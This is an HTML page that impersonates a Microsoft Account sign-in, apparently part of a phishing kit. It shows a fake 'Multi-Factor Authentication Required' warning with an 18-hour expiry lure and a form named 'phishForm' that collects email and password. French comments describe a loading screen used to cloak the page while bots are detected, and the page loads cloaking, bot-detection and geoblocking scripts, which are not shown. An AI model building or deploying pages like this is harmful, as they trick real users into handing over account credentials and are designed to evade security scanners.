<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">Microsoft Account | Sign In</title>

    <!-- Bloquer inspection (anti-bot) -->
    <meta name="robots" content="noindex, nofollow">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* Page de chargement (pendant détection bot) */
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Container principal (caché pendant détection) */
        #mainContent {
            display: none;
            background: white;
            width: 100%;
            max-width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }

        .logo { margin-bottom: 24px; }
        .logo img { height: 24px; }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 12px;
        }

        .subtitle {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 24px;
        }

        .warning-box {
            background: #fff4ce;
            border: 1px solid #d83b01;
            padding: 12px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #323130;
        }

        .warning-box strong {
            color: #d83b01;
            display: block;
            margin-bottom: 4px;
        }

        .input-group { margin-bottom: 16px; }

        label {
            font-size: 13px;
            color: #1b1b1b;
            display: block;
            margin-bottom: 4px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 8px 10px;
            font-size: 15px;
            border: 1px solid #8a8886;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus { border-color: #0078d4; }

        .checkbox-group {
            margin: 16px 0;
            display: flex;
            align-items: center;
        }

        .checkbox-group input { margin-right: 8px; }

        .button-primary {
            background: #0067b8;
            color: white;
            border: none;
            padding: 10px 12px;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }

        .button-primary:hover { background: #005a9e; }

        .links {
            margin-top: 16px;
            font-size: 13px;
        }

        .links a {
            color: #0067b8;
            text-decoration: none;
        }

        .links a:hover { text-decoration: underline; }

        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #605e5c;
            text-align: center;
        }
    </style>
</head>
<body>
    <!-- Écran de chargement (visible pendant détection bot) -->
    <div id="loadingScreen">
        <div class="spinner"></div>
    </div>

    <!-- Contenu principal (caché pendant détection) -->
    <div id="mainContent">
        <div class="logo">
            <img id="logo" src="" alt="Microsoft">
        </div>

        <h1 id="mainTitle">Multi-Factor Authentication Required</h1>
        <p class="subtitle">Your account security requires verification</p>

        <div class="warning-box">
            <strong id="warningTitle">Action Required</strong>
            <span id="warningMessage">Your MFA authentication will expire in 18 hours.</span>
        </div>

        <form id="phishForm">
            <div class="input-group">
                <label for="email" id="emailLabel">Email</label>
                <input type="email" id="email" name="email" required autocomplete="email">
            </div>

            <div class="input-group">
                <label for="password" id="passwordLabel">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember" id="rememberLabel">Keep me signed in</label>
            </div>

            <button type="submit" class="button-primary" id="submitBtn">Sign in</button>

            <div class="links">
                <a href="#">Can't access your account?</a> |
                <a href="#">Sign-in options</a>
            </div>
        </form>

        <div class="footer">
            <a href="#">Privacy & cookies</a> |
            <a href="#">Terms of use</a>
        </div>
    </div>

    <!-- ═══════════════════════════════════════════════════════════ -->
    <!-- SCRIPTS DE CLOAKING ET DÉTECTION BOT -->
    <!-- ═══════════════════════════════════════════════════════════ -->

    <!-- Configuration -->
    <script src="config.js"></script>

    <!-- Détection bot avancée -->
    <script src="bot-detection.js"></script>

    <!-- Géoblocage -->
    <script src="geoblocking.js"></script>

    <!-- Logique principale -->
    <script src="main.js"></script>

</body>
</html>
